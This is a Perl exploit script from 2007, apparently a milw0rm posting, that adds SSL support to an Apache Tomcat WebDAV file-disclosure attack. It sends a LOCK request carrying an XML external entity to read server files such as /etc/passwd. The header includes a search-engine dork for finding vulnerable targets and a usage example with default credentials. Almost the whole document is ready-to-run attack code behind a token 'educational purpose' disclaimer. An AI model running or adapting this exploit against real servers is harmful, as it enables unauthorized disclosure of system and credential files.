<html><head><title>Apache Tomcat (webdav) Remote File Disclosure Exploit (ssl support)</title></head><pre>#!/usr/bin/perl
#================================================================
# Apache Tomcat Remote File Disclosure Zeroday Xploit - With support for SSL
# MoDiFiEd version by  : h3rcul3s 
# ORiGiNaL Version by  : kcdarookie aka eliteb0y / 2007  http://milw0rm.org/exploits/4530
# MoDiFiCaTiOn	       : This code is useble against targets over SSL
# Prerequisites        : A valid login credentials, webdav 
# DoRk                 : intitle:&quot;Directory Listing For /&quot; + inurl:webdav tomcat 
# Potential targets    : similar to https://www.somehost.com:8443
#================================================================
# THaNkS To eliteb0y, the whole team AnD &quot;perlmonks&quot;.
# This piece of code is written ONLY for educational purpose. 
# Use it at your own risk. 
# No author will be responsible for any damage.
#================================================================
# -------------------------[C O D E]-----------------------------
#================================================================
use LWP::Protocol::https;
use IO::Socket;
use MIME::Base64; ### FIXME! Maybe support other auths too ?

# SET REMOTE PORT HERE--------------------------------------------
$remoteport = 8443;

sub usage {
       print &quot;\nApache Tomcat Remote File Disclosure Zeroday Xploit\n&quot;;
       print &quot;\n\n&quot;;
       print &quot;Basic exploit by      : kcdarookie aka eliteb0y / 2007\n&quot;;
       print &quot;SSL Support added by  : .o0|h 3 r c u l 3 s|0o. \n&quot;;
       print &quot;\n\n&quot;;
       print &quot;USAGE  :\nperl  TOMCATXPL-SSL &lt;remotehost&gt; &lt;webdav file&gt; &lt;file to retrieve&gt; [username] [password] [https]\n&quot;;
       print &quot;\nExample:\nperl TOMCATXPL-SSL www.hostname.com /webdav /etc/passwd tomcat tomcat https\n\n&quot;;exit;
           }

if ($#ARGV &lt; 2) {usage();}

$hostname = $ARGV[0];
$webdavfile = $ARGV[1];
$remotefile = $ARGV[2];
$username = $ARGV[3];
$password = $ARGV[4];

my $sock = LWP::Protocol::https::Socket-&gt;new(PeerAddr =&gt; $hostname,
					PeerPort =&gt; $remoteport,
                     			Proto    =&gt; 'tcp');
$|=1;

$BasicAuth = encode_base64(&quot;$username:$password&quot;);

$KRADXmL =
&quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\n&quot;
.&quot;&lt;!DOCTYPE REMOTE [\n&quot;
.&quot;&lt;!ENTITY RemoteX SYSTEM \&quot;$remotefile\&quot;&gt;\n&quot;
.&quot;]&gt;\n&quot;
.&quot;&lt;D:lockinfo xmlns:D='DAV:'&gt;\n&quot;
.&quot;&lt;D:lockscope&gt;&lt;D:exclusive/&gt;&lt;/D:lockscope&gt;\n&quot;
.&quot;&lt;D:locktype&gt;&lt;D:write/&gt;&lt;/D:locktype&gt;\n&quot;
.&quot;&lt;D:owner&gt;\n&quot;
.&quot;&lt;D:href&gt;\n&quot;
.&quot;&lt;REMOTE&gt;\n&quot;
.&quot;&lt;RemoteX&gt;&amp;RemoteX;&lt;/RemoteX&gt;\n&quot;
.&quot;&lt;/REMOTE&gt;\n&quot;
.&quot;&lt;/D:href&gt;\n&quot;
.&quot;&lt;/D:owner&gt;\n&quot;
.&quot;&lt;/D:lockinfo&gt;\n&quot;;

print &quot;\nApache Tomcat Remote File Disclosure Zeroday Eploit-SSL verssion\n&quot;;
print &quot;\n&quot;;
print &quot;Launching Remote Exploit over SSL...\n&quot;;

$ExploitRequest =
 &quot;LOCK $webdavfile HTTP/1.1\r\n&quot;
.&quot;Host: $hostname\r\n&quot;;

if ($username ne &quot;&quot;) {
$ExploitRequest .= &quot;Authorization: Basic $BasicAuth\r\n&quot;;
}
$ExploitRequest .= &quot;Content-Type: text/xml\r\nContent-Length: &quot;.length($KRADXmL).&quot;\r\n\r\n&quot; . $KRADXmL;

print $sock $ExploitRequest;

while(&lt;$sock&gt;) {
       print;
}

# milw0rm.com [2007-10-21]</pre></html>